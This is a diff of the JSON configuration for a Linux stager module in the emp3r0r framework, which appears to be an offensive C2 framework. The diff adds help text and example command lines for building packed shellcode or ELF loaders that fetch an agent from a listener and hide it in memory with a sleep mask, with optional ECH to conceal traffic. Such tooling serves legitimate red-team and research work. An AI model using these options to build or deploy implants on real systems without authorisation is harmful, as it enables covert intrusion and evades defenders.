@@ -4,6 +4,13 @@
   "author": "jm33-ng",
   "date": "2025-12-12",
   "comment": "A Linux stager with modular payload transports (http, tcp, udp, and library-backed ones such as libcurl and libssl), RC4/LZSS packing, a pluggable sleep mask, and optional local C agent PIC embedding. Use with emp3r0r-listener",
+  "help": "Build a Linux stager for a C agent PIC. The stager either embeds the PIC (--agent-pic) or downloads it from a payload listener at run time, then starts it under a sleep mask. format=raw is shellcode for a loader, packed is self-unpacking shellcode, executable is a runnable ELF, and so is a shared library. Download mode omits --agent-pic and sets payload-host, payload-port, payload-path, and payload-key to match emp3r0r-listener; transport selects http, tcp, udp, libcurl, or libssl. dynload-mode public targets glibc 2.34+ and libc_dl targets older glibc. supervise keeps the agent in a child process across restarts and requires a stager-built agent. The build result is the deliverable; do not execute it on the operator host.",
+  "examples": [
+    "stager_linux --format executable --agent-pic /path/to/agent.bin",
+    "stager_linux --format executable --transport http --payload-host 203.0.113.10 --payload-port 8000 --payload-path / --payload-key shared-key",
+    "stager_linux --format so --agent-pic /path/to/agent.bin",
+    "stager_linux --format packed --agent-pic /path/to/agent.bin --unpacker lzss"
+  ],
   "is_local": true,
   "platform": "Linux",
   "path": "",
@@ -12,14 +19,25 @@
       "name": "format",
       "description": "Stager can be generated as shared library (.so), ELF executable, raw shellcode (.bin), or self-unpacking packed shellcode (.bin)",
       "default": "raw",
-      "choices": ["so", "executable", "raw", "packed"],
+      "choices": [
+        "so",
+        "executable",
+        "raw",
+        "packed"
+      ],
       "type": "cstr"
     },
     {
       "name": "transport",
       "description": "Transport used to download the payload. Built-in: http, tcp, udp. Runtime-library transports: libcurl, libssl (HTTPS with a malleable HTTP profile). Custom transports can be added as transport_<name>.c",
       "default": "http",
-      "choices": ["http", "tcp", "udp", "libcurl", "libssl"],
+      "choices": [
+        "http",
+        "tcp",
+        "udp",
+        "libcurl",
+        "libssl"
+      ],
       "type": "cstr"
     },
     {
@@ -56,35 +74,50 @@
       "name": "unpacker",
       "description": "Packing algorithm used for the self-unpacking packed format (rc4: encrypted, lzss: compressed)",
       "default": "rc4",
-      "choices": ["rc4", "lzss"],
+      "choices": [
+        "rc4",
+        "lzss"
+      ],
       "type": "cstr"
     },
     {
       "name": "mask",
       "description": "Sleep-mask provider compiled into the stager: 'xor' (default) XORs the agent image in place while it sleeps. Add mask_<name>.c to the module and build with mask=<name>",
       "default": "xor",
-      "choices": ["xor"],
+      "choices": [
+        "xor"
+      ],
       "type": "cstr"
     },
     {
       "name": "dynload-mode",
       "description": "Which dl* symbols to resolve from libc at runtime: 'public' (dlopen/dlsym/dlclose, glibc >= 2.34) or 'libc_dl' (glibc-internal __libc_dlopen_mode/__libc_dlsym/__libc_dlclose for older glibc)",
       "default": "public",
-      "choices": ["public", "libc_dl"],
+      "choices": [
+        "public",
+        "libc_dl"
+      ],
       "type": "cstr"
     },
     {
       "name": "hash-style",
       "description": "Dynamic symbol hash table to use: 'auto' (DT_HASH then DT_GNU_HASH), 'sysv' (DT_HASH only), or 'gnu' (DT_GNU_HASH only)",
       "default": "auto",
-      "choices": ["auto", "sysv", "gnu"],
+      "choices": [
+        "auto",
+        "sysv",
+        "gnu"
+      ],
       "type": "cstr"
     },
     {
       "name": "ech",
       "description": "Enable Encrypted Client Hello (ECH) for the libssl transport. Requires OpenSSL 4.0+ on the target and an ECH-capable front (eg. Cloudflare); falls back to normal TLS when unsupported. Ignored by other transports",
       "default": "off",
-      "choices": ["off", "on"],
+      "choices": [
+        "off",
+        "on"
+      ],
       "type": "cstr"
     },
     {
@@ -97,7 +130,10 @@
       "name": "supervise",
       "description": "Run the agent PIC in a sacrificial child process and cache its ephemeral identity key pair across restarts: the child exits cleanly when idle and the parent restarts it, so the agent's memory is fully reclaimed while the C2's pinned TOFU identity survives. Requires an agent built with --stager",
       "default": "off",
-      "choices": ["off", "on"],
+      "choices": [
+        "off",
+        "on"
+      ],
       "type": "cstr"
     },
     {
